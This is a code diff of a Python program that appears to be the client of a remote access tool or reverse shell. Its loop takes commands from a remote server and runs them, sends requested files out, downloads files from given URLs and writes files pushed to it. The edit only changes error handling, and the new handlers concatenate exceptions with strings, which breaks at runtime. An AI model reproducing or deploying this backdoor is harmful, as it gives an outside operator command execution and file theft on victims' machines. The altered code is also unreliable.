@@ -12,7 +12,6 @@ PORT = 1000
 sock = None
 active = False
 
-# ⬆️
 def upload(sock, fn):
   try:
     f = open(fn, 'rb')
@@ -23,8 +22,8 @@ def upload(sock, fn):
     time.sleep(1)
 
     return 'File sent 🍺'
-  except IOError:
-    return 'Error opening file ⚠️'
+  except Exception as e:
+    return e + ' ⚠️'
 
 def dlhttp(sock, url):
   fn = url.split('/')[-1]
@@ -36,7 +35,7 @@ def dlhttp(sock, url):
     f.write(urlopen(url).read())
     f.close()
     return 'Download finished 🍺'
-  except OSError as e: # TODO
+  except Exception as e:
     return e + ' ⚠️'
 
 def run(s):
@@ -64,7 +63,6 @@ while True:
     while active:
       data = Receive(sock)
 
-      # server closed
       if not data:
         active = False
         sock.close()
@@ -73,26 +71,20 @@ while True:
       if type(data) == str:
         if data.startswith('dl '):
           ret = upload(sock, data[3:])
-
         elif data.startswith('dlhttp '):
           ret = dlhttp(sock, data[7:])
-
         else:
           ret = run(data)
-
-        Send(sock, cwd(ret))
-
-      # ⬇️
       else:
         try:
           f = open(data[0], 'wb')
           f.write(data[1])
           f.close()
           ret = 'File received 🍺'
-        except IOError:
-          ret = 'Error opening file ⚠️'     
+        except Exception as e:
+          ret = e + ' ⚠️'     
        
-        Send(sock, cwd(ret))
+      Send(sock, cwd(ret))
 
   except socket.error:
     sock.close()
